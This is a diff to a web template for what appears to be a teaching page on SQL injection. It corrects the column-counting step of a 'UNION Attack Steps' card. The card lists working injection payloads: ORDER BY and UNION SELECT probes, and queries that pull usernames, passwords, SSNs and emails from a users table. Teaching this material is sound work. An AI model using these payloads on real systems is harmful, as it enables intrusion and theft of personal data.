@@ -57,7 +57,7 @@
       <div class="card-header"><span>💡</span><span class="card-title">UNION Attack Steps</span></div>
 
       {% set steps = [
-        ("Step 1 — Count columns", "' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--  ← error here = 3 columns\nOR: ' UNION SELECT NULL,NULL,NULL--"),
+        ("Step 1 — Count columns", "' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--\n' ORDER BY 4--  ← error here = 3 columns hence 4 will show an error\nOR: ' UNION SELECT NULL,NULL,NULL--"),
         ("Step 2 — Find string col", "' UNION SELECT 'a',NULL,NULL--\n' UNION SELECT NULL,'a',NULL--  ← 'a' in output = col 2 is string"),
         ("Step 3 — Extract users", "' UNION SELECT NULL,username,password FROM users--"),
         ("Step 4 — Get all data", "' UNION SELECT NULL,username||':'||password||':'||ssn,email FROM users--"),
